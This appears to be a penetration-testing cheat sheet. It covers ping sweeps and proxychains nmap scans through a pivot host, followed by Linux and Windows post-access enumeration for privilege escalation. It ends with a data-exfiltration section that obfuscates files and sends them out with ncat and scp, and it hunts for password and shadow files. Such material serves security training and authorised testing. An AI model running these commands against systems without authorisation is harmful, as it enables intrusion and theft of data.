# Hosts Discovery Commands

## Host Discovery

### Ping Sweep

Run from the pivot box or any new box you land on. Always run this to find potential next pivots and enumerate those boxes before moving on.

```bash
for i in {96..127}; do (ping -c 1 10.0.0.$i | grep "bytes from" &); done
```

**NOTE:** You MUST calculate and replace the range based on proper subnet calculation. This is Bash syntax, so you must enter it from a Bash shell. Be sure to do this on ALL new subnets.

---

## Host Enumeration

A dynamic tunnel must be set up on the PIVOT host with access to the range to be scanned.

### Port Scan (from op station)

```bash
proxychains nmap -Pn -sT 10.0.0.X -p 22,80,443,2222,4444,9999
```

---

## Host Interrogation

### Banner Grab (from op station)

```bash
proxychains nmap -Pn -sV 10.0.0.X -p 80
```

### NSE Scan (from op station)

```bash
# HTTP
proxychains nmap -Pn -sT 10.0.0.X -p 80 --script http-enum.nse

# SMB
proxychains nmap -Pn -sT 10.0.0.X -p 80 --script smb-os-discovery.nse
```

---

## Host Enumeration -- Linux

Reference: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

**Goal:** Gather information about the environment to escalate privileges, learn more about the network, and understand admin behavior.

**Tip:** When checking directories, always use `ls -la`. You never know what can be hiding.

### System Information

| Command | Purpose |
|---------|---------|
| `date` / `time` | Knowing date and time helps correlate logs and identify target's time zone |
| `whoami` | Who we are logged in as |
| `id` | Permissions group (do we have root permissions) |
| `groups` | See what groups we are in (are we in the sudoers) |
| `sudo -l` | Do we have any binaries that execute with higher privs |
| `cat /etc/passwd` | User information |
| `cat /etc/shadow` | User information (need privileged access) |
| `w` | Who is logged in, terminal and what they are doing (tty = direct connections, pts = SSH/telnet) |
| `last` | Information about users that logged in (user habits, timing) |
| `uptime` | How long has the machine been up (good pivot candidate?) |
| `hostname` | Name of machine |
| `uname -a` | Kernel information and architecture |
| `cat /etc/*rel*` | OS version information |

### Networking Information

| Command | Purpose |
|---------|---------|
| `ip addr` | Info about network interfaces (IPs, subnets, etc.) |
| `ifconfig -a` | Info about network interfaces (deprecated) |
| `cat /etc/hosts` | Translates hostnames/domain names to IP addresses |
| `cat /etc/resolv.conf` | Configure DNS name servers |
| `ss -antp` | Displays TCP socket information (listeners and established connections, `-p` needs root) |
| `netstat -antp` | Displays TCP socket information (listeners and established connections, `-p` needs root) |
| `netstat -anup` | Displays UDP socket information |
| `netstat -rn` | Prints routing table |
| `arp -an` | Prints ARP table |

### Process Information

| Command | Purpose |
|---------|---------|
| `ps -ef` | Prints all processes in full-format listing |
| `ps -auxf` | Prints all processes with additional info |
| `lsof -p [pid]` | List of open files opened by a specific process |
| `ls -al /proc/[pid]` | List directory of a specific PID |
| `service --status-all` | Shows all services and their running status |
| `systemctl list-units --type=service` | Another way to list all services |

### Logging

| Location | Purpose |
|----------|---------|
| `cat /etc/rsyslog.conf` | Default rsyslog config file; check rules and for remote logging |
| `/etc/rsyslog.d` | Directory where additional config files are kept |
| `/var/log` | Default location for Linux system logs |

### Crontabs

Why check Crontabs? Crontabs are owned by respective users, so you will not be able to see other users' crontabs. Multiple ways and places to look for cron jobs/scripts:

```bash
/var/spool/cron/crontabs
/etc/cron.d
ls -la /etc/cron*
cat /etc/cron*
crontab
sudo crontab -u student -l
```

### Finding Files

```bash
# Find any file starting with the word "password"
find / -name password* 2>/dev/null

# Find any file with "test" in its name (case insensitive)
find / -iname *test* 2>/dev/null

# Find all .txt files
find / -type f -name *.txt

# Find all hidden files
find / -type f -name ".*"

# Find all hidden directories
find / -type d -name ".*"
```

**Key directories to check:**

- `/tmp` -- world writable
- `/home` -- user home folders
- `/etc` -- default location for config files

---

## Host Enumeration -- Windows

### General Information

```cmd
Date /t
Time /t
Hostname
Whoami
systeminfo
```

### User Information

```cmd
Net user
Net localgroup
Net localgroup administrators
Net use
```

### Network Information

```cmd
Ipconfig /all
Ipconfig /displaydns
Route print
Netstat -ant
Netstat -anob          :: Requires admin
```

### Interesting Locations

- Explorer > View > Hidden Items (turn on show hidden items)
- Check users documents, downloads, desktops

```cmd
Dir c:\windows\prefetch                              :: Requires admin; shows executed programs
Dir /a:h                                             :: Show hidden files
dir /o:d /t:w c:\windows\system32
dir /o:d /t:w c:\windows\system32\winevt\logs
dir /o:d /t:w c:\windows\temp
reg query hklm\software\microsoft\windows\currentversion\run /s   :: Don't forget HKCU and RunOnce
```

### Processes and Services

```cmd
Tasklist /v
Tasklist /svc
tasklist /svc | findstr /i "PID"

Services.msc                                         :: GUI
Sc query <service name>

Schtasks
schtasks /query /fo LIST /v
schtasks /query
```

### Quick Reference: Cross-Platform Enumeration

| Task | Windows | Linux |
|------|---------|-------|
| User Enumeration | `net user` | `cat /etc/passwd` |
| Process Enumeration | `tasklist /v` | `ps -elf` |
| Service Enumeration | `tasklist /v` | `chkconfig` / `systemctl --type=service` |
| Network Connections | `ipconfig /all` | `ifconfig -a` / `ip a` |

### Data Exfiltration

**Session Transcript:**

```bash
ssh <user>@<host> | tee
```

**Obfuscation (Windows):**

```powershell
type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
certutil -encode <file> encoded.b64
```

**Obfuscation (Linux):**

```bash
cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
cat <file> | base64
```

**Encrypted Transport:**

```bash
scp <source> <destination>
ncat --ssl <ip> <port> < <file>
```

---

## NMAP Scripts

### Port Scan

```bash
proxychains nmap -Pn -sT 10.0.0.X -p 22,80,443,2222,4444,9999
```

### Banner Grab

```bash
proxychains nmap -Pn -sV 10.0.0.X -p 80
```

### NSE Scripts

```bash
# HTTP enumeration
proxychains nmap -Pn -sT 10.0.0.X -p 80 --script http-enum.nse

# SMB OS discovery
proxychains nmap -Pn -sT 10.0.0.X -p 80 --script smb-os-discovery.nse
```
